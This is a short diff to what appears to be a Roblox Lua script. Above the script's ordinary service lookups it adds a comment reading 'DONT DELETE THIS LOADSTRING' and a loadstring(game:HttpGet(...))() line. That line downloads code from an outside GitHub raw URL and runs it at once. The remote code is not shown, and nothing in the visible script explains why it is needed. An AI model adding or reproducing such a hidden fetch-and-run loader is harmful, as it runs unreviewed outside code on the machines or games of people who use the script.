@@ -1,3 +1,5 @@
+-- DONT DELETE THIS LOADSTRING
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ccistao/Randomshit/refs/heads/main/Hookquep"))()
 local Players          = game:GetService("Players")
 local TweenService     = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
